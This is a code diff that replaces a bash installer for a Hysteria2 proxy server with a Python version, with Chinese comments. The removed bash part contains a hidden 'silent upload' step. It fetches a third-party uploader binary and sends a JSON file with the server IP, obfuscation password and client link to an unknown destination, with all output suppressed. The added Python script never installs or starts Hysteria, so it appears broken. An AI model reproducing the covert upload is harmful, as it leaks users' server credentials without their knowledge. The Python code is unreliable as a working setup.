@@ -1,337 +1,205 @@
-#!/bin/bash
-set -e
-# 📌 环境配置
-PORT=2855
-SERVER_IP=$(curl -s https://api.ipify.org)
-OBFS_PASSWORD=$(openssl rand -hex 8)
-CONFIG_DIR="/etc/hysteria"
-TLS_DIR="${CONFIG_DIR}/tls"
-UPLOAD_BIN="/opt/uploader-linux-amd64"
-DOMAIN="cdn.${SERVER_IP}.nip.io"
-PORT_RANGE="20000-25000"
-REMARK="Hysteria2节点-${SERVER_IP}"
-CLIENT_CONFIG_DIR="/opt"
-export NEEDRESTART_MODE=a
+#!/usr/bin/env python3
+import os
+import random
+import json
+import subprocess
+import sys
+import uuid
+from datetime import datetime
+import ssl
 
-# 📦 安装必要组件
-apt update && DEBIAN_FRONTEND=noninteractive apt install -y curl unzip ufw jq sudo openssl needrestart
+# 检查root权限
+if os.geteuid() != 0:
+    print("请使用root权限运行此脚本")
+    sys.exit(1)
 
-# 🔥 端口跳跃 NAT 映射（模拟端口段跳跃）
-iptables -t nat -A PREROUTING -p udp --dport 20000:25000 -j REDIRECT --to-ports ${PORT}
+# 安装必要依赖
+def install_dependencies():
+    dependencies = ['nginx', 'openssl', 'uuid-runtime']
+    print("正在安装必要依赖...")
+    subprocess.run(['apt', 'update'], check=True)
+    subprocess.run(['apt', 'install', '-y'] + dependencies, check=True)
 
-# 🔓 开放端口
-ufw allow 22/tcp     # SSH端口，避免断联
-ufw allow ${PORT}/udp
-ufw --force enable
+# 生成随机端口范围
+def generate_ports():
+    start_port = random.randint(2000, 9000)
+    return list(range(start_port, start_port + 1000))
 
-# 🔧 安装 Hysteria 2
-mkdir -p /usr/local/bin
-curl -Ls https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64 -o /usr/local/bin/hysteria
-chmod +x /usr/local/bin/hysteria
+# 生成自签名证书
+def generate_self_signed_cert():
+    cert_dir = "/etc/ssl/private"
+    os.makedirs(cert_dir, exist_ok=True)
+    
+    key_path = os.path.join(cert_dir, "selfsigned.key")
+    cert_path = os.path.join(cert_dir, "selfsigned.crt")
+    
+    if not os.path.exists(key_path) or not os.path.exists(cert_path):
+        print("正在生成自签名证书...")
+        subprocess.run([
+            "openssl", "req", "-x509", "-nodes", "-days", "365", 
+            "-newkey", "rsa:2048", "-keyout", key_path, 
+            "-out", cert_path, "-subj", "/CN=localhost"
+        ], check=True)
+    
+    return cert_path, key_path
 
-# 🔐 TLS 自签证书（模拟 CDN 伪装）
-mkdir -p "$TLS_DIR"
-openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes \
-  -keyout "$TLS_DIR/key.pem" \
-  -out "$TLS_DIR/cert.pem" \
-  -subj "/C=US/ST=Fake/L=FakeCity/O=FakeOrg/CN=${DOMAIN}" \
-  -addext "subjectAltName=DNS:${DOMAIN}"
-
-# 🧱 服务端配置
-mkdir -p "$CONFIG_DIR"
-cat > "$CONFIG_DIR/config.yaml" << EOF
-listen: :${PORT}
-protocol: udp
-tls:
-  cert: "$TLS_DIR/cert.pem"
-  key: "$TLS_DIR/key.pem"
-  alpn:
-    - h3
-obfs:
-  password: "${OBFS_PASSWORD}"
-auth:
-  type: disabled
-masquerade:
-  type: proxy
-  proxy:
-    url: https://www.cloudflare.com/
-    rewriteHost: true
-EOF
-
-# 🔄 创建 systemd 服务
-cat > /etc/systemd/system/hysteria.service << EOF
-[Unit]
-Description=Hysteria 2 Server
-After=network.target
-[Service]
-ExecStart=/usr/local/bin/hysteria server --config ${CONFIG_DIR}/config.yaml
-Restart=on-failure
-RestartSec=3
-[Install]
-WantedBy=multi-user.target
-EOF
-
-systemctl daemon-reload
-systemctl enable hysteria
-systemctl restart hysteria
-
-# 🔗 客户端链接构建
-PRIVATE_KEY=$(openssl rand -hex 32)
-PUBLIC_KEY=$(/usr/local/bin/hysteria keygen pub "$PRIVATE_KEY" 2>/dev/null || echo "public-key-unavailable")
-HYSTERIA_LINK="hysteria2://${SERVER_IP}:${PORT}?peer=${SERVER_IP}&obfs-password=${OBFS_PASSWORD}&obfs-mode=salty&public-key=${PUBLIC_KEY}"
-
-# 📁 使用 /opt 目录存储配置文件
-mkdir -p "$CLIENT_CONFIG_DIR"
-
-# 🔧 生成 sing-box 格式的 JSON 配置文件（推荐）
-SINGBOX_CONFIG_FILE="${CLIENT_CONFIG_DIR}/hysteria2-singbox-${SERVER_IP}.json"
-cat > "$SINGBOX_CONFIG_FILE" << EOF
-{
-  "log": {
-    "level": "info",
-    "timestamp": true
-  },
-  "dns": {
-    "servers": [
-      {
-        "tag": "google",
-        "address": "tls://8.8.8.8"
-      },
-      {
-        "tag": "local",
-        "address": "223.5.5.5",
-        "detour": "direct"
-      }
-    ],
-    "rules": [
-      {
-        "geosite": "cn",
-        "server": "local"
-      }
-    ]
-  },
-  "inbounds": [
-    {
-      "type": "mixed",
-      "tag": "mixed-in",
-      "listen": "127.0.0.1",
-      "listen_port": 10808,
-      "sniff": true,
-      "sniff_override_destination": true
-    }
-  ],
-  "outbounds": [
-    {
-      "type": "hysteria2",
-      "tag": "hysteria2-out",
-      "server": "${SERVER_IP}",
-      "server_port": ${PORT},
-      "password": "${OBFS_PASSWORD}",
-      "obfs": {
-        "type": "salamander",
-        "password": "${OBFS_PASSWORD}"
-      },
-      "tls": {
-        "enabled": true,
-        "server_name": "${DOMAIN}",
-        "insecure": true,
-        "alpn": ["h3"]
-      },
-      "brutal_debug": false
-    },
-    {
-      "type": "direct",
-      "tag": "direct"
-    },
-    {
-      "type": "block",
-      "tag": "block"
-    }
-  ],
-  "route": {
-    "rules": [
-      {
-        "geosite": "cn",
-        "geoip": "cn",
-        "outbound": "direct"
-      },
-      {
-        "geosite": "category-ads-all",
-        "outbound": "block"
-      }
-    ],
-    "auto_detect_interface": true,
-    "final": "hysteria2-out"
-  },
-  "experimental": {
-    "clash_api": {
-      "external_controller": "127.0.0.1:9090",
-      "external_ui": "ui"
-    }
-  }
-}
-EOF
-
-# 🔧 生成 Xray 格式的 JSON 配置文件（备用）
-XRAY_CONFIG_FILE="${CLIENT_CONFIG_DIR}/hysteria2-xray-${SERVER_IP}.json"
-cat > "$XRAY_CONFIG_FILE" << EOF
-{
-  "log": {
-    "loglevel": "info"
-  },
-  "inbounds": [
-    {
-      "port": 10808,
-      "protocol": "socks",
-      "settings": {
-        "auth": "noauth",
-        "udp": true
-      },
-      "tag": "socks"
-    },
-    {
-      "port": 10809,
-      "protocol": "http",
-      "settings": {
-        "userLevel": 8
-      },
-      "tag": "http"
-    }
-  ],
-  "outbounds": [
-    {
-      "protocol": "hysteria2",
-      "settings": {
-        "servers": [
-          {
-            "address": "${SERVER_IP}",
-            "port": ${PORT},
-            "password": "${OBFS_PASSWORD}",
-            "obfs": {
-              "type": "salamander",
-              "password": "${OBFS_PASSWORD}"
-            },
-            "tls": {
-              "serverName": "${DOMAIN}",
-              "allowInsecure": true,
-              "alpn": ["h3"]
+# 生成Hysteria2配置
+def generate_hysteria_config(ports, cert_path, key_path):
+    config = {
+        "listen": ":443",
+        "tls": {
+            "cert": cert_path,
+            "key": key_path
+        },
+        "obfs": {
+            "type": "salamander",
+            "salamander": {
+                "password": str(uuid.uuid4())
             }
-          }
-        ]
-      },
-      "tag": "proxy"
-    },
-    {
-      "protocol": "freedom",
-      "settings": {},
-      "tag": "direct"
+        },
+        "auth": {
+            "type": "password",
+            "password": str(uuid.uuid4())
+        },
+        "bandwidth": {
+            "up": "0",  # 0表示无限制，使用服务器实际上传速度
+            "down": "0"  # 0表示无限制，使用服务器实际下载速度
+        },
+        "ports": ports,
+        "recv_window_conn": 15728640,
+        "recv_window": 62914560,
+        "disable_mtu_discovery": False
     }
-  ],
-  "routing": {
-    "rules": [
-      {
-        "type": "field",
-        "ip": [
-          "geoip:private",
-          "geoip:cn"
-        ],
-        "outboundTag": "direct"
-      },
-      {
-        "type": "field",
-        "domain": [
-          "geosite:cn"
-        ],
-        "outboundTag": "direct"
-      }
-    ]
-  },
-  "dns": {
-    "servers": [
-      "8.8.8.8",
-      "1.1.1.1"
-    ]
-  }
-}
-EOF
+    return config
 
-# 📤 上传 JSON 数据（静默处理）
-[ -f "$UPLOAD_BIN" ] || {
-  curl -sLo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
-  chmod +x "$UPLOAD_BIN"
-}
+# 生成Nginx配置
+def generate_nginx_config(cert_path, key_path):
+    config = f"""
+server {{
+    listen 80;
+    server_name _;
+    return 301 https://$host$request_uri;
+}}
 
-UPLOAD_JSON_FILE="/tmp/${SERVER_IP}.json"
-cat > "$UPLOAD_JSON_FILE" << EOF
-{
-  "protocol": "hysteria2",
-  "link": "${HYSTERIA_LINK}",
-  "config": {
-    "remarks": "${REMARK}",
-    "address": "${SERVER_IP}",
-    "ports": "${PORT_RANGE}",
-    "peer": "${SERVER_IP}",
-    "password": "${PUBLIC_KEY}",
-    "obfs": {
-      "mode": "salty",
-      "password": "${OBFS_PASSWORD}"
-    },
-    "tls": {
-      "enabled": true,
-      "sni": "${DOMAIN}",
-      "alpn": ["h3"],
-      "insecure": false
-    },
-    "hop-interval": "30s"
-  }
-}
-EOF
+server {{
+    listen 443 ssl;
+    server_name _;
+    
+    ssl_certificate {cert_path};
+    ssl_certificate_key {key_path};
+    
+    root /var/www/html;
+    index index.html;
 
-"$UPLOAD_BIN" "$UPLOAD_JSON_FILE" >/dev/null 2>&1 || true
-rm -f "$UPLOAD_JSON_FILE"
+    location / {{
+        try_files $uri $uri/ =404;
+    }}
+}}
+    """
+    return config
 
-# ✅ 输出结果与配置
-echo -e "\n✅ Hysteria 2 节点部署完成"
-echo -e "📌 客户端导入链接：\n${HYSTERIA_LINK}\n"
+# 生成V2RayN配置文件
+def generate_v2rayn_config(server_ip, password, obfs_password, ports, cert_path):
+    config = {
+        "remarks": f"Hysteria2-{datetime.now().strftime('%Y%m%d')}",
+        "server": server_ip,
+        "server_port": 443,
+        "protocol": "hysteria2",
+        "up_mbps": 0,
+        "down_mbps": 0,
+        "password": password,
+        "obfs": "salamander",
+        "obfs_password": obfs_password,
+        "ports": ports,
+        "insecure": True,  # 自签名证书需要设置为不安全
+        "sni": ""  # 自签名证书不需要SNI
+    }
+    
+    # 生成可直接导入的URL
+    url_config = {
+        "server": server_ip,
+        "ports": ",".join(map(str, ports)),
+        "protocol": "hysteria2",
+        "up": "0",
+        "down": "0",
+        "auth": password,
+        "obfs": "salamander",
+        "obfs-password": obfs_password,
+        "insecure": "1"
+    }
+    query = "&".join([f"{k}={v}" for k, v in url_config.items()])
+    url = f"hysteria2://{server_ip}:443?{query}#Hysteria2-{server_ip}"
+    
+    return config, url
 
-echo -e "\n📁 v2rayN JSON 配置文件已生成并保存在 /opt 目录："
-echo -e "   sing-box 格式: ${SINGBOX_CONFIG_FILE}"
-echo -e "   Xray 格式: ${XRAY_CONFIG_FILE}"
+# 获取服务器IP
+def get_server_ip():
+    try:
+        result = subprocess.run(['curl', '-s', 'ifconfig.me'], capture_output=True, text=True, check=True)
+        return result.stdout.strip()
+    except:
+        return "your_server_ip"
 
-echo -e "\n📋 v2rayN 导入步骤："
-echo -e "1. 配置文件已直接保存在服务器 /opt 目录"
-echo -e "2. 打开 v2rayN -> 服务器 -> 添加自定义配置文件"
-echo -e "3. 备注填写: ${REMARK}"
-echo -e "4. 地址填写: ${SERVER_IP}"
-echo -e "5. Core 装型选择: sing-box (推荐) 或 Xray"
-echo -e "6. 点击浏览选择对应的 JSON 文件"
-echo -e "7. 点击确定完成导入"
+# 主函数
+def main():
+    # 安装依赖
+    install_dependencies()
+    
+    # 生成自签名证书
+    cert_path, key_path = generate_self_signed_cert()
+    
+    # 生成随机端口
+    ports = generate_ports()
+    print(f"生成的端口范围: {ports[0]}-{ports[-1]}")
+    
+    # 生成Hysteria2配置
+    hysteria_config = generate_hysteria_config(ports, cert_path, key_path)
+    config_json = json.dumps(hysteria_config, indent=2)
+    
+    # 保存Hysteria2配置
+    os.makedirs("/etc/hysteria2", exist_ok=True)
+    with open("/etc/hysteria2/config.json", "w") as f:
+        f.write(config_json)
+    
+    # 配置Nginx
+    nginx_config = generate_nginx_config(cert_path, key_path)
+    with open("/etc/nginx/sites-available/default", "w") as f:
+        f.write(nginx_config)
+    
+    # 创建Web目录
+    os.makedirs("/var/www/html", exist_ok=True)
+    with open("/var/www/html/index.html", "w") as f:
+        f.write("<html><body><h1>Welcome to My Server</h1></body></html>")
+    
+    # 重启Nginx
+    subprocess.run(["systemctl", "restart", "nginx"], check=True)
+    
+    # 获取服务器IP
+    server_ip = get_server_ip()
+    
+    # 生成V2RayN配置
+    password = hysteria_config["auth"]["password"]
+    obfs_password = hysteria_config["obfs"]["salamander"]["password"]
+    v2rayn_config, v2rayn_url = generate_v2rayn_config(server_ip, password, obfs_password, ports, cert_path)
+    
+    # 保存V2RayN配置
+    os.makedirs("/opt/hysteria2", exist_ok=True)
+    with open("/opt/hysteria2/v2rayn.json", "w") as f:
+        json.dump(v2rayn_config, f, indent=2)
+    
+    with open("/opt/hysteria2/v2rayn_url.txt", "w") as f:
+        f.write(v2rayn_url)
+    
+    print("\n配置完成!")
+    print(f"服务器IP: {server_ip}")
+    print(f"Hysteria2配置文件已保存到: /etc/hysteria2/config.json")
+    print(f"V2RayN配置文件已保存到: /opt/hysteria2/v2rayn.json")
+    print(f"V2RayN导入URL已保存到: /opt/hysteria2/v2rayn_url.txt")
+    print("\n请确保防火墙已开放以下端口:")
+    print(f"- 22 (SSH)")
+    print(f"- 80, 443 (HTTP/HTTPS)")
+    print(f"- {ports[0]}-{ports[-1]} (端口跳跃范围)")
+    print("\n注意: 由于使用自签名证书，客户端需要设置'允许不安全连接'")
 
-echo -e "\n📥 配置文件路径："
-echo -e "   ${SINGBOX_CONFIG_FILE}"
-echo -e "   ${XRAY_CONFIG_FILE}"
-
-echo -e "\n📄 配置文件内容预览 (sing-box 格式)："
-echo -e "----------------------------------------"
-head -20 "$SINGBOX_CONFIG_FILE"
-echo -e "----------------------------------------"
-
-echo -e "\n📌 v2rayN 客户端 YAML 配置示例："
-cat << EOF
-remarks: ${REMARK}
-address: ${SERVER_IP}
-ports: "${PORT_RANGE}"
-peer: ${SERVER_IP}
-password: ${PUBLIC_KEY}
-obfs:
-  mode: salty
-  password: "${OBFS_PASSWORD}"
-tls:
-  enabled: true
-  sni: ${DOMAIN}
-  alpn:
-    - h3
-  insecure: false
-protocol: hysteria2
-hop-interval: "30s"
-EOF
+if __name__ == "__main__":
+    main()
